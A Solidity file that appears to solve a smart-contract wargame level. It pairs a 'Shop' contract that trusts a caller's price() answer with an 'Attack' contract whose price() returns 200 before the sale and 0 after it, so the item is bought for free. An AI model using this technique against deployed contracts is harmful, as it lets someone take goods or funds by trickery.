// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack {

    function price() external view returns (uint){
       Shop shop = Shop(0xD99563F29407DE857dfE81EDC74bf4072e43be34);
       if (shop.isSold()){
           return 0;
       }else{
           return 200;
       }
    }

    function buy() public{
        Shop shop = Shop(0xD99563F29407DE857dfE81EDC74bf4072e43be34);
        shop.buy();
    }
}
